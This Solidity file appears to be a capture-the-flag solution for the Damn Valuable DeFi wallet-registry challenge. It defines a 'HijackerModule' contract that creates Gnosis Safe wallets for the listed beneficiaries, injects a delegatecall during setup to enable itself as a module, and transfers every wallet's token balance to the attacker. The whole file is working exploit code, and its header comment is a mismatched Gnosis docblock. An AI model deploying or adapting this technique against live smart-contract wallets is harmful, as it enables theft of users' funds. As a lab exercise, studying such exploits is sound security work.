// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/// @title Singleton - Base for singleton contracts (should always be first super contract)
///         This contract is tightly coupled to our proxy contract (see `proxies/GnosisSafeProxy.sol`)
/// @author Richard Meissner - <richard@gnosis.io>
contract HijackerModule { 
	address[] public receiversAddress;
	address tokenAddress;
	address registryAddress;
	address singletonAddress;
	address factoryAddress;

	constructor(
		address[] memory _receiversAddress,
		address _tokenAddress,
		address _registryAddress,
		address _singletonAddress,
		address _factoryAddress
    ) {
    	receiversAddress = _receiversAddress;
    	tokenAddress = _tokenAddress;
		registryAddress = _registryAddress;
		singletonAddress = _singletonAddress;
		factoryAddress = _factoryAddress;
    }

    /*Functions called via delegatecall. So we pass myAddress as parameter instead of using address(this), which would resolver to GnosisSafe address*/
    function registerAsModule(address myAddress) external {
    	address gnosisSafe = address(this);
    	(bool success, bytes memory data) = gnosisSafe.call(
            abi.encodeWithSignature("enableModule(address)", myAddress)
        );

        require(success, "Could not register hijacker as a module");

    }

    /*function registerAsOwner(address myAddress) external {
    	address gnosisSafe = address(this);
    	(bool success, bytes memory data) = gnosisSafe.call(
            abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", myAddress, 1)
        );

        require(success, "Could not register hijacker as a module");
    }*/

    function withdraw(address attackerAddr, address tokenAddr) external {
    	DamnValuableToken token = DamnValuableToken(tokenAddr);
    	token.transfer(attackerAddr, token.balanceOf(address(this)));
    }


    /*Function called directly from EOA*/
    function exploit() external {
    	/*
    	For each receiver
    	1. Create wallet passing registerAsModule as calldata
    	2. Withdraw
    	*/
    	for(uint i = 0; i < receiversAddress.length; i++) {
    		address[] memory _owners = new address[](1);
    		_owners[0] = receiversAddress[i];

    		bytes memory hijackData = abi.encodeWithSignature("registerAsModule(address)", address(this));
    		bytes memory initializerData = abi.encodeWithSelector(GnosisSafe.setup.selector, _owners, 1, address(this), hijackData, address(0), address(0), 0, address(0));

    		GnosisSafe gs = GnosisSafe(payable(address(
    			GnosisSafeProxyFactory(factoryAddress).createProxyWithCallback(singletonAddress, initializerData, 0, IProxyCreationCallback(registryAddress) )
    		)));

    		bytes memory withdrawData = abi.encodeWithSignature("withdraw(address,address)", msg.sender, tokenAddress);
    		gs.execTransactionFromModule(address(this), 0, withdrawData, Enum.Operation.DelegateCall);
    	}
    }
}